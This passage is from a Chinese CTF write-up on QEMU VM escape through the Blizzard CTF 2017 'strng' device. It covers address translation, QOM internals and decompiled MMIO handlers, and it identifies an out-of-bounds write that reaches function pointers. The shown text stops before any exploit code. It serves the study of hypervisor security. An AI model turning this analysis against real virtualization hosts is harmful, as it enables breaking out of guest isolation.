
最终效果
![](upload/attach/202101/876323\_SYBV33S6DTQAJZE.gif)

# ref

[VM escape - QEMU Case Study](http://www.phrack.org/papers/vm-escape-qemu-case-study.html)
[Linux用户空间将虚拟地址转化为物理地址](https://rtoax.blog.csdn.net/article/details/108983905)
[浅谈内存映射I/O(MMIO)与端口映射I/O(PMIO)的区别](https://www.cnblogs.com/idorax/p/7691334.html)
[浅谈 Linux 内核开发之 PCI 设备驱动](https://www.ibm.com/developerworks/cn/linux/l-cn-pci/index.html)
[QEMU学习笔记——QOM(Qemu Object Model)](https://www.binss.me/blog/qemu-note-of-qemu-object-model/)
[QEMU中KVM的初始化调用路径](https://juejin.cn/post/6844903844455907335)
[KVM Log 1-QEMU Object Module (QOM)](https://silentming.net/blog/2017/08/14/kvm-log-1-qemu-module-intro/)
[https://github.com/grandemk/qemu\_devices/blob/master/hello\_tic.c](https://github.com/grandemk/qemu\_devices/blob/master/hello\_tic.c)

一直想入门一下虚拟化安全这一块，前一阵一直在研究内核方向的内容，正好这几天也换一换脑子。

目录

- qemu overview
- [内存布局](https://bbs.kanxue.com/#内存布局)
- [IO交互](https://bbs.kanxue.com/#io交互)
- [mmio（内存映射IO）](https://bbs.kanxue.com/#mmio（内存映射io）)
- [pmio（端口映射IO）](https://bbs.kanxue.com/#pmio（端口映射io）)
- STRNG PCI设备
- 从QOM(Qemu Object Model)模型看strng源码
- 什么是QOM(Qemu Object Model)？
- [QOM如何工作？](https://bbs.kanxue.com/#qom如何工作？)
- [（1）TypeInfo](https://bbs.kanxue.com/#（1）typeinfo)
- [（2）TypeImpl](https://bbs.kanxue.com/#（2）typeimpl)
- [（3）ObjectClass](https://bbs.kanxue.com/#（3）objectclass)
- [（4）Object](https://bbs.kanxue.com/#（4）object)
- [（5）MemoryRegion](https://bbs.kanxue.com/#（5）memoryregion)
- [（6）其他](https://bbs.kanxue.com/#（6）其他)
- [题目概览](https://bbs.kanxue.com/#题目概览)
- [strng\_mmio\_read](https://bbs.kanxue.com/#strng_mmio_read)
- [strng\_mmio\_write](https://bbs.kanxue.com/#strng_mmio_write)
- [尝试利用MMIO进行越界写](https://bbs.kanxue.com/#尝试利用mmio进行越界写)
- [strng\_pmio\_read](https://bbs.kanxue.com/#strng_pmio_read)
- [strng\_pmio\_write](https://bbs.kanxue.com/#strng_pmio_write)
- [漏洞利用](https://bbs.kanxue.com/#漏洞利用)
- [exp](https://bbs.kanxue.com/#exp)
- [ref](https://bbs.kanxue.com/#ref)

**本文目标：**

1. 对 **QEMU虚拟机** 结构有一个初步的介绍及认识。

2. 初识 **QOM(Qemu Object Model)** 对象模型。

3. 通过分析 **Blizzard CTF 2017** 练习qemu调试等内容。

4. 实现 **qemu逃逸** 弹个 `gnome-calculator`。

题目：[Blizzard CTF 2017](https://bbs.kanxue.com/elink@45dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5j5%4k6S2L8r3I4W2i4K6u0r3j5X3I4A6P5Y4A6S2M7X3c8U0N6r3j5J5x3o6p5%4)

**strng虚拟机的源码如下：**

365K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5j5%4k6S2L8r3I4W2i4K6u0r3j5X3I4A6P5Y4A6S2M7X3c8U0N6r3j5J5x3o6p5%4i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8Y4y4@1M7X3&6Y4i4K6u0W2j5H3`.`.

## qemu overview

![](https://bbs.kanxue.com/upload/attach/202101/876323_SFNDT7H88YVDYUK.jpg)

## 内存布局

在虚拟机中不论是kvm还是qemu有几个关键的地址。

GVA：guest virtual address（虚拟机中的虚拟地址）

GPA：guest physical address（虚拟机中的物理地址）

HVA：host virtual address（宿主机中的虚拟地址）

HPA： host physical address（宿主机中的物理地址）

```
`Guest' processes  +------------------+
Virtual addr space   |                    |
+------------------+                                    （GVA）
|                    |
\__   Page Table     \__
\                    \
|                    |  Guest kernel
+----+-------------------+-----------------+-----------+
Guest's phy. memory |    |                    |                |            （GPA）
+----+-------------------+-----------------+-----------+
|                                          |
\__                                        \__
\                                          \
|             QEMU process                 |
+----+-----------------------------------+-----------------+-----------+
Virtual addr space |    |                                          |         （HVA）
+----+-----------------------------------+-----------------+-----------+
|                                               |
\__                Page Table                   \__
\                                               \
|                                               |
+----+-------------------------------------------+----------+++
Physical memory    |    |                                               ||    （HPA）
+----+----------------------------------------------+----------+---+
```

这里跟kvm一样。HVA对应GPA。

整体地址的话：从GVA -> GPA -> HVA -> HPA 这样的转换。

而GPA实际是由宿主机进程mmap出来的空间。

而在qemu-kvm架构下，**QEMU充当kvm的前端，传递IO。kvm负责做内存以及CPU的虚拟化。**

我们使用如下脚本启动 strng 虚拟机。

```
./qemu-system-x86_64 \
-m 1G \
-device strng \
-hda my-disk.img \
-hdb my-seed.img \
-nographic \
-L pc-bios/ \
-enable-kvm \
-device e1000,netdev=net0 \
-netdev user,id=net0,hostfwd=tcp::5555-:22
```

注意最后一行将22端口映射到宿主机的5555端口。所以我们可以通过：

```
ssh ubuntu@127.0.0.1 -p 5555
```

登录虚拟机。

在 [VM escape - QEMU Case Study](https://bbs.kanxue.com/elink@4a2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Y4M7X3q4F1k6r3g2E0K9#2)9J5c8Y4q4W2L8i4g2Q4y4h3k6V1k6i4k6A6j5$3g2K6i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8X3S2W2L8r3I4G2i4K6g2X3N6r3W2U0i4K6u0W2j5H3`.`.) 中给出了一个 mmu.c 用来做地址转换，其代码如下：

```c
---[ mmu.c ]---
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <assert.h>
#include <inttypes.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)    //4096
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int fd;

uint32_t page_offset(uint32_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr); //这里的addr属于gva，获取对应的page frame number
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr); //返回对应的GPA
}

int main()
{
    uint8_t *ptr;
    uint64_t ptr_mem;

    fd = open("/proc/self/pagemap", O_RDONLY); //通过读取pagemap文件，可以得到进程从虚拟地址到物理地址映射的信息
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    ptr = malloc(256); //首先开256的空间
    strcpy(ptr, "Where am I?"); //将字符串拷贝过去
    printf("%s\n", ptr);
    ptr_mem = gva_to_gpa(ptr); //guest virtual mem -> guest physicals mem

    //此时的ptr_mem对应的是虚拟机里字符串所在的物理内存地址。
    printf("Your physical address is at 0x%"PRIx64"\n", ptr_mem);

    getchar();
    return 0;
}
```

官方文档：28bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2C8k6i4u0F1k6h3I4Q4x3X3g2G2M7X3N6Q4x3V1k6V1L8$3y4Q4x3V1k6p5L8$3y4#2L8h3g2F1N6r3q4@1K9h3!0F1i4K6u0r3N6X3#2Q4x3V1k6H3j5h3N6W2L8h3q4H3i4K6u0W2N6s2S2@1

这个mmu.c是要跑在我们虚拟机里的。

用户名：ubuntu，密码：passw0rd。

编译mmu.c：

```
root@ubuntu:~# gcc mmu.c -static -m32 -o mmu
```

然后将其scp到虚拟机里：

```
root@ubuntu:~# scp -P5555 mmu ubuntu@127.0.0.1:/home/ubuntu
The authenticity of host '[127.0.0.1]:5555 ([127.0.0.1]:5555)' can't be established.
ECDSA key fingerprint is SHA256:zoKoYVjPeMIA7zfSHVgA4+Q9bMN1IExTtD0rxTU7cLg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[127.0.0.1]:5555' (ECDSA) to the list of known hosts.
ubuntu@127.0.0.1's password:
mmu
```

可以看到已经有了如下内容

```
ubuntu@ubuntu:~$ ls
mmu
```

然后sudo运行：

```
ubuntu@ubuntu:~$ sudo ./mmu
sudo: unable to resolve host ubuntu
Where am I?
Your physical address is at 0x30bda008
```

接下来使用qemu attach上去：

```
root@ubuntu:~# ps -ef | grep qemu
root 20265 20264 0 Jan18 pts/2 00:03:36 ./qemu-system-x86_64 -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22
```

首先找出qemu的进程pid，然后attach：

![](https://bbs.kanxue.com/upload/attach/202101/876323_3Q8KGX48XMUTEU6.jpg)

之后我们找到这里：

![](https://bbs.kanxue.com/upload/attach/202101/876323_7C3DKZPP3N2A6KX.jpg)

可以看到对应的就是我们这个字符串的地址：

![](https://bbs.kanxue.com/upload/attach/202101/876323_T5KW3VPCYXGTTDT.jpg)

而 `0x7fc0a7e00000` 就是我们虚拟机的物理地址为0的位置。

## IO交互

通过源码我们可以看到，strng主要实现了：`strng_pmio_xxxx` 以及 `strng_mmio_xxxx` 也就是mmio和pmio这两个东西。

### mmio（内存映射IO）

简单来说就是IO设备与内存共享同样的地址空间，以此来进行交互。

### pmio（端口映射IO）

内存和I/O设备有各自的地址空间，不共享内存（被隔离）。而通过 `in`、`out`、`outw`、`outl` 等指令实现交互。

### STRNG PCI设备

PCI 是 Peripheral Component Interconnect 的缩写。

Q：什么是PCI设备？

A：**符合 PCI 总线标准的设备就被称为 PCI 设备**，PCI 总线架构中可以包含多个 PCI 设备。图中的 Audio、LAN 都是一个 PCI 设备。PCI 设备同时也分为主设备和目标设备两种，主设备是一次访问操作的发起者，而目标设备则是被访问者。

![](https://bbs.kanxue.com/upload/attach/202101/876323_6868VY7JPZ36322.jpg)

而在我们的strng虚拟机中：

```
ubuntu@ubuntu:~$ lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02) //主板芯片
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02) //显卡
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03) //网卡
```

lspci查看我们的pci设备。再看启动命令，发现有一行：

`-device strng \`

实际这就是告诉我们，strng是以虚拟机中的一个 **pci设备** 存在的。

通过阅读源码，我们也可发现确实有一个函数负责pci设备（strng）的注册：`pci_strng_register_types()`

而在lspci的内容中我们发现了：

```
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
```

这样一行unclassfied的设备。他的设备 **id是0x11e9**，猜测这个就是strng。

根据 a99K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0j5h3^5%4i4K6u0W2L8%4u0Y4i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6E0j5h3&6Q4x3X3c8H3j5h3N6W2M7#2)9J5c8X3#2S2L8U0S2Q4x3V1k6D9M7%4m8U0K9g2)9J5k6e0S2Q4x3X3g2Z5N6r3#2D9

lspci输出的内容对应的格式如下：`[domain:]bus:device.function`

`lspci -t -v` 可以树状显示。

```
ubuntu@ubuntu:~$ lspci -t -v
-[0000:00]-+-00.0  Intel Corporation 440FX - 82441FX PMC [Natoma]
           +-01.0  Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
           +-01.1  Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
           +-01.3  Intel Corporation 82371AB/EB/MB PIIX4 ACPI
           +-02.0  Device 1234:1111
           +-03.0  Device 1234:11e9
           \-04.0  Intel Corporation 82540EM Gigabit Ethernet Controller
```

那么 `strng` 的总线对应的就是 `00:03.0` ，域为[0000]

通过 `lspci -v`

```
ubuntu@ubuntu:~$ lspci -v

00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
    Subsystem: Red Hat, Inc Device 1100
    Physical Slot: 3
    Flags: fast devsel
    Memory at febf1000 (32-bit, non-prefetchable) [size=256] //这里给出了mmio的地址空间0xfebf1000
    I/O ports at c050 [size=8] //pmio端口为0xc050
```

我们可以查看显示所有设备的详细信息。

我们可以得到如下两个有用的信息：

- MMIO的地址空间`0xfebf1000`
- PMIO对应的端口为`0xc050`

接下来，我们可以通过 `ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/` 查看其对应的 `resource` 文件。

```
ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/

-r--r--r-- 1 root root 4096 Jan 19 11:51 resource
-rw------- 1 root root 256 Jan 19 14:36 resource0
-rw------- 1 root root 8 Jan 19 14:36 resource1
```

`resource0` 对应MMIO空间。

`resource1` 对应PMIO空间。

```
ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource

/*
   start addr           end addr                flags
*/
0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
（MMIO）
0x000000000000c050 0x000000000000c057 0x0000000000040101
（PMIO）
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

从左至右依次是：起始地址、结束地址、标志位。

第一行是MMIO、第二行是PMIO。

## 从QOM(Qemu Object Model)模型看strng源码

虽然是第一次接触qemu-pwn，不过对于著名的QOM模型早已经有所耳闻，于是就跟着QOM模型梳理一下strng的源码，加深一下理解。

### 什么是QOM(Qemu Object Model)？

*Everything in QOM is a device*

QOM是QEMU **在C的基础上自己实现的一套面向对象机制**，负责将device、bus等设备都抽象成为对象。

**下面给出一些重要的QOM Terminology(术语)**

来源：56fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2D9K9h3&6#2P5q4)9J5k6r3E0$3L8g2)9J5k6h3!0J5k6#2)9J5c8X3W2E0j5h3N6W2M7#2)9J5c8X3k6Q4x3V1k6X3y4W2)9J5c8U0t1H3x3e0u0Q4x3X3c8X3L8%4u0#2L8g2)9J5k6q4q4a6e0g2)9#2k6V1y4b7g2g2)9J5k6i4m8V1k6R3`.`.

• Type（类型） ‒ Defines class

• Class（类） ‒ Stores static data & virtual method pointers ‒ Lazily initialized from type and, optionally, static data（存储静态数据以及一些函数指针）

• Object（对象） ‒ Stores dynamic data (“chunk of allocated memory”) （储存动态数据）

• Property（属性） ‒ Accessor to dynamic object data ‒ Inspectable via monitor interface（访问对象中的动态数据，通过interface可以进行监控）

### QOM如何工作？

在QOM中有几个重要的结构体

06eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6I4k6h3#2#2i4K6u0r3M7h3g2E0N6g2)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6A6L8X3y4D9N6h3c8W2i4K6u0r3M7h3!0E0i4K6u0r3L8$3u0B7k6h3y4@1i4K6u0W2K9l9`.`.

##### （1）TypeInfo

```c
struct TypeInfo
{
    const char *name;
    const char *parent; //父类

    size_t instance_size;
    size_t instance_align;
    void (*instance_init)(Object *obj); //实例初始化函数
    void (*instance_post_init)(Object *obj);
    void (*instance_finalize)(Object *obj); //实例“析构”函数

    bool abstract; //是否为抽象类
    size_t class_size; //类大小，官方文档中提出.class_size字段设置为sizeof(MyClass)

    void (*class_init)(ObjectClass *klass, void *data); //在所有父类被初始化完成后调用的子类初始化函数，可用于override virtual methods
    void (*class_base_init)(ObjectClass *klass, void *data);
    void *class_data;

    InterfaceInfo *interfaces; //封装了const char *type;
};
```

类比到 **strng** 源码：

```c
static void pci_strng_register_types(void)
{
    static const TypeInfo strng_info = { //这里就是一个TypeInfo结构体
        .name = "strng",
        .parent = TYPE_PCI_DEVICE, //父类为 TYPE_PCI_DEVICE
        .instance_size = sizeof(STRNGState),
        .instance_init = strng_instance_init,
        .class_init = strng_class_init, //类初始化，虚函数覆写
    };

    type_register_static(&strng_info);
}
type_init(pci_strng_register_types)
```

可以看到，在 `pci_strng_register_types` 中首先定义了 `TypeInfo strng_info` 并对其中一些内容进行赋值。

在代码最后部分，首先调用 `type_init()` 负责注册。

```c
#define type_init(function) module_init(function, MODULE_INIT_QOM)

#define module_init(function, type)                                        \
static void __attribute__((constructor)) do_qemu_init_ ## function(void)  \
{                                                                            \
    register_module_init(function, type);                                   \
}
```

最终调用了 `register_module_init()`

```c
typedef struct ModuleEntry
{
    void (*init)(void);
    QTAILQ_ENTRY(ModuleEntry) node;
    module_init_type type;
} ModuleEntry;

static void init_lists(void)
{
    static int inited;
    int i;

    if (inited) {
        return;
    }

    for (i = 0; i < MODULE_INIT_MAX; i++) {
        QTAILQ_INIT(&init_type_list[i]);
    }

    QTAILQ_INIT(&dso_init_list);

    inited = 1;
}

static ModuleTypeList *find_type(module_init_type type)
{
    init_lists();

    return &init_type_list[type];
}

void register_module_init(void (*fn)(void), module_init_type type)
{
    ModuleEntry *e;
    ModuleTypeList *l;

    e = g_malloc0(sizeof(*e));
    e->init = fn;
    e->type = type;

    l = find_type(type); //调用init_lists()做了初始化

    QTAILQ_INSERT_TAIL(l, e, node);
}
```

主要做了如下事情：

1. malloc一个新的 `ModuleEntry` 结构体。并插入 `init_type_list[Module_Init_Type]` 链表中。
2. 将 `ModuleEntry` 的 `init` 函数指针赋值为 `fn` 。（这个 `init` 也是当前这个 `module` 的初始化函数）

而需要注意的是，由于 `__attribute__((constructor))` 的存在，这一部分内容作为 `构造函数` 都将在main函数之前调用。

具体的规则可以看：

[C Language Constructors and Destructors with GCC](https://bbs.kanxue.com/elink@712K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3K9r3!0^5K9i4y4Q4x3X3g2G2M7X3N6Q4x3V1j5J5x3o6p5I4i4K6u0r3x3o6c8Q4x3V1j5J5y4#2)9J5c8X3y4Q4x3X3c8D9j5h3&6Y4N6h3q4Y4k6g2)9J5k6r3y4G2L8Y4y4@1M7Y4g2U0N6r3!0J5M7#2)9J5k6r3q4F1k6q4)9J5k6r3c8W2M7%4c8J5N6h3y4@1L8%4u0K6i4K6u0V1N6$3W2@1K9q4)9J5k6r3N6U0j5#2)9J5c8R3`.`.)

总结一下：

在QEMU真正启动之前，所有 `module_entry` 都被插入 `init_type_list` 。并且已经确定了初始化函数。

而接下来，在qemu启动阶段main函数调用的时候，会对 `init_type_list[Module_Init_Type]` 链表中的每一个 `ModuleEntry` 调用其 `init` 函数。所以对于我们的strng里就是 `pci_strng_register_types()`。

`pci_strng_register_types()` 中首先对设备的一些信息做了初始化，接着调用了：`type_register_static(&strng_info)`

##### （2）TypeImpl

定义如下：

```c
struct TypeImpl
{
    const char *name;

    size_t class_size;

    size_t instance_size;
    size_t instance_align;

    void (*class_init)(ObjectClass *klass, void *data);
    void (*class_base_init)(ObjectClass *klass, void *data);

    void *class_data;

    void (*instance_init)(Object *obj);
    void (*instance_post_init)(Object *obj);
    void (*instance_finalize)(Object *obj);

    bool abstract;

    const char *parent;
    TypeImpl *parent_type;

    ObjectClass *class; //指向 ObjectClass 的指针

    int num_interfaces;
    InterfaceImpl interfaces[MAX_INTERFACES];
};
```

由`type_register_static(&strng_info)` 最终调用了 `type_register_internal(&strng_info)`

```c
static TypeImpl *type_register_internal(const TypeInfo *info)
{
    TypeImpl *ti;
    ti = type_new(info); //根据info信息，创建一个TypeImpl对象

    type_table_add(ti); //将新建的TypeImpl对象注册到全局哈希表 type_table 中
    return ti;
}
```

至此，这个 `ModuleEntry` 向 `TypeImpl表` 中的注册就算完成了。

##### （3）ObjectClass

ObjectClass是所有class的基类，定义如下：

```c
struct ObjectClass
{
    /* private: */
    Type type;
    GSList *interfaces;

    const char *object_cast_cache[OBJECT_CLASS_CAST_CACHE];
    const char *class_cast_cache[OBJECT_CLASS_CAST_CACHE];

    ObjectUnparent *unparent;

    GHashTable *properties;
};
```

在前面几步中，实际上我们只完成了 **Module的注册**，而没有真正完成 **类的初始化**。

接下来我们通过 `TypeInfo strng_info` 中的 `.class_init = strng_class_init` 简单看一下 **Type(类)的初始化**。

在初始化每一个 type 的时候调用的是： `type_initialize` 函数。

给出对应的注释后的源码：

```c
static void type_initialize(TypeImpl *ti) //针对每一个注册的 TypeImpl 去做type 初始化
{
    TypeImpl *parent;

    //在 TypeImpl 中有 ObjectClass *class
    if (ti->class) { //如果 ti->class存在，那么说明初始化过了，直接return
        return;
    }

    ti->class_size = type_class_get_size(ti);
    ti->instance_size = type_object_get_size(ti);

    if (ti->instance_size == 0) { //如果instance_size为0，标记为抽象类
        ti->abstract = true;
    }
    if (type_is_ancestor(ti, type_interface)) {
        ......
    }
    ti->class = g_malloc0(ti->class_size);

    parent = type_get_parent(ti); // 是否有父类？即是否存在继承关系？
    if (parent) { // 如果存在继承关系的话
        type_initialize(parent); //初始化父类
        GSList *e;
        int i;

        g_assert(parent->class_size <= ti->class_size);
        g_assert(parent->instance_size <= ti->instance_size);
        memcpy(ti->class, parent->class, parent->class_size); //首先用父类数据 初始化
        ti->class->interfaces = NULL;

        for (e = parent->class->interfaces; e; e = e->next) {
            InterfaceClass *iface = e->data;
            ObjectClass *klass = OBJECT_CLASS(iface);

            type_initialize_interface(ti, iface->interface_type, klass->type); //初始化对应接口
        }

        for (i = 0; i < ti->num_interfaces; i++) {
            TypeImpl *t = type_get_by_name(ti->interfaces[i].typename);
            if (!t) {
                error_report("missing interface '%s' for object '%s'",
                             ti->interfaces[i].typename, parent->name);
                abort();
            }
            for (e = ti->class->interfaces; e; e = e->next) {
                TypeImpl *target_type = OBJECT_CLASS(e->data)->type;

                if (type_is_ancestor(target_type, t)) {
                    break;
                }
            }

            if (e) {
                continue;
            }

            type_initialize_interface(ti, t, t); //初始化接口
        }
    }

    /* 建立存放属性的hash表 */
    ti->class->properties = g_hash_table_new_full(g_str_hash, g_str_equal, NULL,
                                                  object_property_free);

    ti->class->type = ti;

    while (parent) {
        /* 对于父类来说，如果定义了class_base_init，就调用它 */
        if (parent->class_base_init) {
            parent->class_base_init(ti->class, ti->class_data);
        }
        parent = type_get_parent(parent);
    }

    /* 调用当前TypeImpl的class_init */
    if (ti->class_init) {
        ti->class_init(ti->class, ti->class_data);
    }
}
```

注意，此处的我们说的类实际是 **类对象**，对应基类ObjectClass

##### （4）Object

Object是 **类实例对象**，是所有 **类实例对象的基类**

```c
struct Object
{
    /* private: */
    ObjectClass *class; //class指向对应的类对象，ObjectClass和Object通过他来联系
    ObjectFree *free;
    GHashTable *properties; //对应的属性
    uint32_t ref; //引用计数
    Object *parent; //指向父类实例对象
};
```

在我们初始化了对应的 **ObjectClass** 后，接下来初始化 **Object**

Object的创建由 `k->realize = pci_testdev_realize;` 函数实现，不同于 type 和 class 的构造，`Object` 是**根据需要**创建的。

而一个Object对应着一个我们指定的**具体的device**。

比如：

```bash
./qemu-system-x86_64 \
    -m 1G \
    -device strng \
```

这里的strng。

我们以strng为例，用户可以定义Type的自己的Object结构体，继承自`PCIDevice`

其初始化由：`pci_strng_realize(PCIDevice *pdev, Error **errp)` 负责。

```c
static void pci_strng_realize(PCIDevice *pdev, Error **errp)
{
    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev); // DO_UPCAST实现了在继承链之间的强制转换

    memory_region_init_io(&strng->mmio, OBJECT(strng), &strng_mmio_ops, strng, "strng-mmio", STRNG_MMIO_SIZE);
    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &strng->mmio);
    memory_region_init_io(&strng->pmio, OBJECT(strng), &strng_pmio_ops, strng, "strng-pmio", STRNG_PMIO_SIZE);
    pci_register_bar(pdev, 1, PCI_BASE_ADDRESS_SPACE_IO, &strng->pmio);
}
```

其中的 **STRNGState** 定义如下：

```c
typedef struct {
    PCIDevice pdev;
    MemoryRegion mmio;
    MemoryRegion pmio;
    uint32_t addr;
    uint32_t regs[STRNG_MMIO_REGS];
    void (*srand)(unsigned int seed);
    int (*rand)(void);
    int (*rand_r)(unsigned int *seed);
} STRNGState;
```

至此 QOM最基本的四个type相关的结构体就介绍完了。

初始化顺序可以认为是：`TypeInfo` -> `TypeImpl` -> `ObjectClass` -> `Object`（自选）

##### （5）MemoryRegion

qemu使用 **MemoryRegion** 来表示对应的内存空间，相应的每一个 **MemoryRegion** 都有对应的 **MemoryRegionOps** 来描述其操做。

比如在strng中举这样一对儿例子：

```c
typedef struct {
    PCIDevice pdev;
    MemoryRegion mmio; //mmio内存空间
    ......
} STRNGState;

static const MemoryRegionOps strng_mmio_ops = { //mmio空间对应的操作
    .read = strng_mmio_read, //对mmio空间的read由strng_mmio_read实现
    .write = strng_mmio_write, //对mmio空间的write由strng_mmio_write实现
    .endianness = DEVICE_NATIVE_ENDIAN,
};
```

有点类似于内核中的 `file ops`。

##### （6）其他

出了前四个结构体，还有 **属性** 之类的结构体等等，不过跟我们这里准备看的关系不大，就不赘述了。有兴趣的可以自行了解。

```c
struct Property
{
    const char *name;
    PropertyInfo *info;
    ptrdiff_t    offset;
    uint8_t      bitnr;
    QType        qtype;
    int64_t      defval;
    int          arrayoffset;
    PropertyInfo *arrayinfo;
    int          arrayfieldsize;
};
```

Property 作为属性模板，用于创建属性对象。

```c
typedef struct ObjectProperty
{
    gchar *name;
    gchar *type;
    gchar *description;
    ObjectPropertyAccessor *get;
    ObjectPropertyAccessor *set;
    ObjectPropertyResolve *resolve;
    ObjectPropertyRelease *release;
    void *opaque;
} ObjectProperty;
```

同时，属性又分为静态属性与动态属性。

## 题目概览

直接把qemu拉到ida里逆向。

然后去搜索strng。

首先将函数中的 opaque参数 进行 **Set Ivar type** 为 **STRNGState \***，注意不是转成 struct \*，此时的 STRNGState 已经是typedef后的一个type了。

然后再去structures里找。

在IDA中的 STRNGState 如下：

```
00000000 ; Ins/Del : create/delete structure
00000000 ; D/A/*   : create structure member (data/ascii/array)
00000000 ; N       : rename structure or structure member
00000000 ; U       : delete structure member
00000000 ;-----------------------------------------------------------------
00000000 
00000000 STRNGState      struc ; (sizeof=0xC10, align=0x10, copyof_3816)
00000000 pdev            PCIDevice_0 ?
000008F0 mmio            MemoryRegion_0 ?
000009F0 pmio            MemoryRegion_0 ?
00000AF0 addr            dd ?
00000AF4 regs            dd 64 dup(?)
00000BF4                 db ? ; undefined
00000BF5                 db ? ; undefined
00000BF6                 db ? ; undefined
00000BF7                 db ? ; undefined
00000BF8 srand           dq ?                    ; offset
00000C00 rand            dq ?                    ; offset
00000C08 rand_r          dq ?                    ; offset
00000C10 STRNGState      ends
00000C10
```

### strng_mmio_read

```c
uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
    uint64_t result; // rax

    result = -1LL;
    if ( size == 4 && (addr & 3) == 0 )
        result = opaque->regs[addr >> 2];
    return result;
}
```

mmio读的操作，如果`size=4`，并且`addr`是4的倍数。

那么取 `STRNGState` 中`regs`区域中`2*addr` 的内容返回。即`* (&regs + 2*addr)`返回。

### strng_mmio_write

```c
void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
    hwaddr choice; // rsi
    int v5; // eax
    int vala; // [rsp+8h] [rbp-30h]

    if ( size == 4 && (addr & 3) == 0 ) //当size为4，且addr是4的倍数
    {
        choice = addr >> 2; // choice = addr*（1/4）
        if ( choice == 1 )
        {
            opaque->regs[1] = (opaque->rand)(opaque, choice, val); //调用rand，放回值放在regs[1]
        }
        else if ( choice )
        {
            if ( choice == 3 ) //choice == 3
            {
                vala = val;
                v5 = opaque->rand_r(&opaque->regs[2]); //调用rand_r()
                LODWORD(val) = vala;
                opaque->regs[3] = v5;
            }
            opaque->regs[choice] = val; //这里可以通过控制addr直接将val放到regs[choice]，choice可以越界
        }
        else
        {
            opaque->srand(val);
        }
    }
}
```

首先 `choice = addr * 1/4`

- 当`choice=0`时，直接调用`srand`，参数为 `val`，不管返回值
- 当`choice=1`时，调用`rand()`，参数为 `opaque, choice, val`，返回值放在`regs[1]`
- 当`choice=3`时，调用`rand_r()`，参数为`regs[2]`的地址，返回值放在`regs[3]`
- 当`choice`不为以上时，直接将`val`写到`regs[choice]`的位置，而`choice`可控（`1/4 * addr`）。意味着我们有机会进行任意地址写。

已知我们的 MMIO空间为0到255，总共256大小。

#### 尝试利用MMIO进行越界写

